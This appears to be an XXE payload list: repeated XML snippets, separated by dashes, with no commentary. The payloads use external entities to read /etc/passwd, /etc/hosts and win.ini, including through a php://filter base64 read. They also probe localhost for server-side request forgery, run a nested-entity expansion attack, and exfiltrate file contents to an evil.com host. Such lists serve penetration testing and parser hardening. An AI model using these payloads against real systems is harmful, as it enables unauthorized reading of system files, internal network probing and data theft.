<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>

<root/>
